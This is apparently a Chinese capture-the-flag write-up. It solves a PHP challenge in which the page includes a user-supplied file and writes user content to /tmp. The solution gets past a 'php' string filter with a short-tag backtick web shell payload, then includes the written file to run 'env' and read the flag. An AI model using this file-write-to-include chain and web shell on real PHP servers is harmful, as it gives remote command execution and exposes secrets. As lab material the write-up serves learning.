利用文件包含和文件写入漏洞获取flag。

打开目标网址`http://ip:port`，网页打印`index.php`的内容：
```php
<?php
    highlight_file("index.php");
    // flag在环境变量$flag中

    if (isset($_GET['file'])) {
        include_once($_GET['file']);
    }

    $content = $_GET['content'];
    if (strpos($content, "php") === 0 || strpos($content, "php") || (!isset($content) && !isset($_GET['file']) )) {
        die("byebye");
    }

    if (isset($content)) {
        $path = "/tmp/".md5(time()).".txt";
        echo $path;
        file_put_contents($path, $content);
    }

?>
```

得知可以将内容写入/tmp/目录下的随机文件名，注意要绕过过滤规则：内容不能以"php"开头或包含"php"字符串。

构造以下URL：
```
http://ip:port/?content=<?=`$_GET[0]`?>
```

服务器返回写入的文件路径：
```
/tmp/d98c6b018074d2ed1546af26574458f7.txt
```

使用获取到的文件路径，通过file参数包含该文件，并传入要执行的命令（显示所有环境变量），从而获取FLAG：
```
http://124.16.75.117:51001/?file=/tmp/d077f...txt&0=env
```